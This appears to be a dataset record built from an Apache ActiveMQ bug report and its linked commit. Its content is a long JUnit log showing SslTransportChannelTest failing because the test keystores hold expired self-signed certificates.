	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	... 5 more
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Failure starting receiver: 
javax.jms.JMSException: start failed: certificate expired
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:199)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	... 5 more
Sender got an exception:
javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doClose(TcpTransportChannel.java:513)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:330)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	... 1 more
Sender got an exception:
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
javax.jms.JMSException: asyncSend failed: java.net.SocketException: Socket is closed
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:483)
	at org.activemq.transport.TransportChannelSupport.asyncSendWithReceipt(TransportChannelSupport.java:160)
	at org.activemq.transport.TransportChannelSupport.send(TransportChannelSupport.java:145)
	at org.activemq.transport.TransportChannelTestSupport.testRpc(TransportChannelTestSupport.java:106)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:58)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:60)
	at java.lang.reflect.Method.invoke(Method.java:391)
	at junit.framework.TestCase.runTest(TestCase.java:154)
	at junit.framework.TestCase.runBare(TestCase.java:127)
	at junit.framework.TestResult$1.protect(TestResult.java:106)
	at junit.framework.TestResult.runProtected(TestResult.java:124)
	at junit.framework.TestResult.run(TestResult.java:109)
	at junit.framework.TestCase.run(TestCase.java:118)
	at junit.framework.TestSuite.runTest(TestSuite.java:208)
	at junit.framework.TestSuite.run(TestSuite.java:203)
	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.run(JUnitTestRunner.java:325)
	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.main(JUnitTestRunner.java:536)
Caused by: java.net.SocketException: Socket is closed
	at java.net.Socket.getSoTimeout(Socket.java:964)
	at com.ibm.sslite.be.getSoTimeout(Unknown Source)
	at com.ibm.sslite.be.a(Unknown Source)
	at com.ibm.sslite.be.<init>(Unknown Source)
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.b.a(Unknown Source)
	at com.ibm.jsse.b.write(Unknown Source)
	at org.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:109)
	at java.io.DataOutputStream.flush(DataOutputStream.java:126)
	at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:475)
	... 18 more
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	at java.lang.Thread.run(Thread.java:570)
java.net.SocketException: Socket is closed
	at java.net.Socket.getSoTimeout(Socket.java:964)
	at com.ibm.sslite.be.getSoTimeout(Unknown Source)
	at com.ibm.sslite.be.a(Unknown Source)
	at com.ibm.sslite.be.<init>(Unknown Source)
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.b.a(Unknown Source)
	at com.ibm.jsse.b.write(Unknown Source)
	at org.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:109)
	at java.io.DataOutputStream.flush(DataOutputStream.java:126)
	at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:475)
	at org.activemq.transport.TransportChannelSupport.asyncSendWithReceipt(TransportChannelSupport.java:160)
	at org.activemq.transport.TransportChannelSupport.send(TransportChannelSupport.java:145)
	at org.activemq.transport.TransportChannelTestSupport.testRpc(TransportChannelTestSupport.java:106)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:58)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:60)
	at java.lang.reflect.Method.invoke(Method.java:391)
	at junit.framework.TestCase.runTest(TestCase.java:154)
	at junit.framework.TestCase.runBare(TestCase.java:127)
	at junit.framework.TestResult$1.protect(TestResult.java:106)
	at junit.framework.TestResult.runProtected(TestResult.java:124)
	at junit.framework.TestResult.run(TestResult.java:109)
	at junit.framework.TestCase.run(TestCase.java:118)
	at junit.framework.TestSuite.runTest(TestSuite.java:208)
	at junit.framework.TestSuite.run(TestSuite.java:203)
	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.run(JUnitTestRunner.java:325)
	at org.apache.tools.ant.taskdefs.optional.junit.JUnitTestRunner.main(JUnitTestRunner.java:536)
Sender got an exception:
Failure starting receiver: 
javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doClose(TcpTransportChannel.java:513)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:330)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	... 1 more
javax.jms.JMSException: start failed: certificate expired
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:199)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	... 5 more
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	at java.lang.Thread.run(Thread.java:570)
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
------------- ---------------- ---------------
Testcase: testSendPacket(org.activemq.transport.ssl.SslTransportChannelTest):	FAILED
Exceptions were thrown: [javax.jms.JMSException: start failed: certificate expired, javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired]
junit.framework.AssertionFailedError: Exceptions were thrown: [javax.jms.JMSException: start failed: certificate expired, javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired]
	at org.activemq.transport.TransportChannelTestSupport.tearDown(TransportChannelTestSupport.java:254)


Testcase: testAsyncSendWithReceipt(org.activemq.transport.ssl.SslTransportChannelTest):	FAILED
Exceptions were thrown: [javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: start failed: certificate expired]
junit.framework.AssertionFailedError: Exceptions were thrown: [javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: start failed: certificate expired]
	at org.activemq.transport.TransportChannelTestSupport.tearDown(TransportChannelTestSupport.java:254)


Testcase: testRpc(org.activemq.transport.ssl.SslTransportChannelTest):	FAILED
Exceptions were thrown: [javax.jms.JMSException: start failed: certificate expired, javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: asyncSend failed: java.net.SocketException: Socket is closed]
junit.framework.AssertionFailedError: Exceptions were thrown: [javax.jms.JMSException: start failed: certificate expired, javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: asyncSend failed: java.net.SocketException: Socket is closed]
	at org.activemq.transport.TransportChannelTestSupport.tearDown(TransportChannelTestSupport.java:254)


Testcase: testForceDisconnect(org.activemq.transport.ssl.SslTransportChannelTest):	FAILED
Exceptions were thrown: [javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: start failed: certificate expired]
junit.framework.AssertionFailedError: Exceptions were thrown: [javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired, javax.jms.JMSException: start failed: certificate expired]
	at org.activemq.transport.TransportChannelTestSupport.tearDown(TransportChannelTestSupport.java:254)


",a713e6a7d0aea88b3d8c1d952726352060b74804,"Fix for https://issues.apache.org/jira/browse/AMQ-4177

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1410767 13f79535-47bb-0310-9956-ffa450edef68"
12481573,AMQ-417,"Performing full maven build, the following JUnit test for the optional module fails due to expired certificates used in the test -

    [junit] [ERROR] TEST org.activemq.transport.ssl.SslTransportChannelTest FAILED

Both of the certs in the modules\optional\src\test\client.keystore and server.keystore files have expired -
Your keystore contains 1 entry

Alias name: mykey
Creation date: Feb 3, 2005
Entry type: keyEntry
Certificate chain length: 1
Certificate[1]:
Owner: CN=localhost, OU=activemq.org, O=activemq.org, L=LA, ST=CA, C=US
Issuer: CN=localhost, OU=activemq.org, O=activemq.org, L=LA, ST=CA, C=US
Serial number: 4202b790
Valid from: 2/3/05 6:45 PM until: 5/4/05 7:45 PM
Certificate fingerprints:
         MD5:  C1:E4:37:34:0F:A3:C3:C4:6F:AA:F1:AC:59:B1:1D:00
         SHA1: 75:FF:D1:D0:AD:89:88:9A:68:57:B4:06:80:A1:79:80:4F:91:74:F5


Testsuite: org.activemq.transport.ssl.SslTransportChannelTest
Tests run: 4, Failures: 4, Errors: 0, Time elapsed: 2.718 sec

------------- Standard Output ---------------
Server has started
addClient() with receiver: TcpTransportChannel: Socket[addr=/127.0.0.1,port=2420,localport=61617]
Sending packets
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Receiver has started
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Stopping sender
Receiver will be closed by the server
Stopping server
Server has started
addClient() with receiver: TcpTransportChannel: Socket[addr=/127.0.0.1,port=2421,localport=61617]
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Receiver has started
Stopping sender
Receiver will be closed by the server
Stopping server
Server has started
addClient() with receiver: TcpTransportChannel: Socket[addr=/127.0.0.1,port=2422,localport=61617]
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Receiver has started
Reason: java.net.SocketException: Socket is closed
Stopping sender
Receiver will be closed by the server
Stopping server
Server has started
addClient() with receiver: TcpTransportChannel: Socket[addr=/127.0.0.1,port=2423,localport=61617]
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Stopping sender
Receiver will be closed by the server
Stopping server
Reason: javax.net.ssl.SSLHandshakeException: certificate expired
Receiver has started
------------- ---------------- ---------------
------------- Standard Error -----------------
Failure starting receiver: 
javax.jms.JMSException: start failed: certificate expired
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:199)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	... 5 more
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Sender got an exception:
javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doClose(TcpTransportChannel.java:513)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:330)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	... 1 more
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	at java.lang.Thread.run(Thread.java:570)
Sender got an exception:
javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doClose(TcpTransportChannel.java:513)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:330)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	... 1 more
Failure starting receiver: 
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	at java.lang.Thread.run(Thread.java:570)
javax.jms.JMSException: start failed: certificate expired
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:199)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	... 5 more
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Failure starting receiver: 
javax.jms.JMSException: start failed: certificate expired
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:199)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	... 5 more
Sender got an exception:
javax.jms.JMSException: Error reading socket: javax.net.ssl.SSLHandshakeException: certificate expired
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doClose(TcpTransportChannel.java:513)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:330)
	at java.lang.Thread.run(Thread.java:570)
Caused by: javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.DataInputStream.readByte(DataInputStream.java:358)
	at org.activemq.io.AbstractWireFormat.readPacket(AbstractWireFormat.java:230)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:313)
	... 1 more
Sender got an exception:
javax.net.ssl.SSLHandshakeException: certificate expired
	at com.ibm.jsse.bv.a(Unknown Source)
	at com.ibm.jsse.a.a(Unknown Source)
	at com.ibm.jsse.a.read(Unknown Source)
	at java.io.BufferedInputStream.fill(BufferedInputStream.java:200)
	at java.io.BufferedInputStream.read(BufferedInputStream.java:218)
	at java.io.FilterInputStream.read(FilterInputStream.java:86)
	at org.activemq.io.WireFormatLoader.getWireFormat(WireFormatLoader.java:67)
	at org.activemq.transport.tcp.TcpTransportChannel.readWireFormat(TcpTransportChannel.java:208)
	at org.activemq.transport.tcp.TcpTransportChannel.start(TcpTransportChannel.java:178)
	at org.activemq.transport.TransportChannelTestSupport.configureReceiver(TransportChannelTestSupport.java:285)
	at org.activemq.transport.TransportChannelTestSupport.addClient(TransportChannelTestSupport.java:331)
	at org.activemq.transport.TransportServerChannelSupport.addClient(TransportServerChannelSupport.java:98)
	at org.activemq.transport.tcp.TcpTransportServerChannel.run(TcpTransportServerChannel.java:158)
	at java.lang.Thread.run(Thread.java:570)
javax.jms.JMSException: asyncSend failed: java.net.SocketException: Socket is closed
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:483)
	at org.activemq.transport.TransportChannelSupport.asyncSendWithReceipt(TransportChannelSupport.java:160)
	at org.activemq.transport.TransportChannelSupport.send(TransportChannelSupport.java:145)
	at org.activemq.transport.TransportChannelTestSupport.testRpc(TransportChannelTestSupport.java:106)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:58)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:60)
	at java.lang.reflect.Method.invoke(Method.java:391)
	at junit.framework.TestCase.runTest(TestCase.java:154)
	at junit.framework.TestCase.runBare(TestCase.java:127)
	at junit.framework.TestResult$1.protect(TestResult.java:106)
	at junit.framework.TestResult.runProtected(TestResult.java:124)
	at junit.framework.TestResult.run(TestResult.java:109)
	at junit.framework.TestCase.run(TestCase.java:118)
	at junit.framework.TestSuite.runTest(TestSuite.java:208)
